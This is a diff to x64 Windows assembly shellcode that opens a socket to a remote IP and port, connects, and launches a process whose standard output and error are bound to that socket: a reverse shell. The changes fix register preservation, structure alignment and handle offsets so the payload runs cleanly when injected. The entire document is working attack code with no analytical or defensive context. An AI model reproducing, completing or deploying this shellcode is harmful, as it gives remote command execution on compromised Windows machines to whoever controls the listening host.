@@ -178,6 +178,15 @@ ifdef TEST_CODE
 endif
 
 code_start:
+    ; save non-volatile registers
+    push   rbx
+    push   rsi
+    push   rdi
+    push   rbp
+    push   r12
+    push   r13
+    push   r14
+    push   r15
     mov    r15, rsp
     and    rsp, -16
     sub    rsp, 28h
@@ -231,6 +240,8 @@ calc_position:
     stosq      ; hStdOutput = s
     stosq      ; hStdError  = s
     
+    scasq      ; if structures aligned by 8 bytes, we need to skip 8 here
+    
     xchg   eax, ebx
     mov    [rsp][SHELLCODE_SPACE.lpProcessInformation], rdi
     inc    [rsp][SHELLCODE_SPACE.bInheritHandles]
@@ -258,29 +269,38 @@ exec_cmd:
     call   rbp           ; WaitForSingleObject
     
     ; close thread handle
-    mov    rcx, [rdi+8]
+    mov    rcx, [rdi]
     call   rbp           ; CloseHandle
     
     ; close process handle
-    mov    rcx, [rdi+16]
+    mov    rcx, [rdi+8]
     call   rbp           ; CloseHandle
     
     ; close socket handle
     mov    ecx, ebx
     call   rbp           ; closesocket
     
-    ; fix up stack and return
-    ;mov    bl, STACK_SIZE
-    ;add    esp, ebx
+    ; fix up stack, restore non-volatile registers and return
     mov    rsp, r15
+    pop    r15
+    pop    r14
+    pop    r13
+    pop    r12
+    pop    rbp
+    pop    rdi
+    pop    rsi
+    pop    rbx
     ret
 
 load_data:
     call   calc_position
 ; not really data section as we're in same segment
 data_section label qword
+ifdef TEST_CODE
     dq     not ((((mhtons(REMOTE_PORT)) shl 16) or AF_INET) or (REMOTE_IP shl 32))
-    
+else
+    dq     0
+endif
     hashapi "WSASocketA"
     hashapi "connect"
     hashapi "CreateProcessA"
